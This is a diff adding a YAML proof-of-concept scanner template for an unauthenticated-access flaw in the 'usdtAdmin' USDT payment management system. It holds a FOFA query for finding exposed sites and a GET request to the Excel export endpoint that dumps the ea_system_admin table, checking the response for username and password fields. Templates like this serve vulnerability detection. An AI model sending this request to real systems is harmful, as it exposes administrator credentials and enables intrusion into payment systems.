@@ -1,0 +1,16 @@
+id: poc-yaml-usdtadmin-cms-excel-anyfile-unauthorized-access
+info:
+  name: usdtAdmin收款管理系统 excel 未授权访问漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: usdtAdmin收款管理系统
+  fofa: app="/usdtmerchant/login/reg.html"
+requests:
+- method: GET
+  path: /index/getway/excel?down=1&table=ea_system_admin&shunxu=desc&number=10
+  expression: status_code == 200 && contains(body,"USDT数据库ea_system_admin表的数据") &&
+    contains(body,"username") && contains(body,"password") && contains(body,"excel")
+    && contains(headers,"filename=")
+variables: {}
+transport: http
